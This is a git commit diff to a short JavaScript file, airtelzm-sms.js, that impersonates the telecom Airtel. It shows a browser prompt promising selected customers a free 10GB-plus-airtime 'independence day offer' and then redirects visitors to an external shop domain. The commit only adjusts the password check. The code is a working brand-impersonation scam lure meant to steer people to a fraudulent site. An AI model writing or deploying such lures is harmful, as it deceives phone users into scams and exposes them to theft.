82f52492ba7a935408494d6e1f023a95dfa50d90
bigetijazz6 <bigetijazz6@gmail.com>
2024-10-13 20:18:35 -0700

    Update airtelzm-sms.js

--- airtelzm-sms.js
+++ airtelzm-sms.js
@@ -1,6 +1,6 @@
 
 var password = 'ACTIVATE 10GB + AIRTIME'
 password=prompt('Airtel: Hello, you are among the selected customers to receive independence day offer, Press OK to get offer now','1');
-if (password != '1') {
+if (password != 'ACTIVATE 10GB + AIRTIME') {
 location.href='https://www.offre-beta.shop/airtelreward';
 }
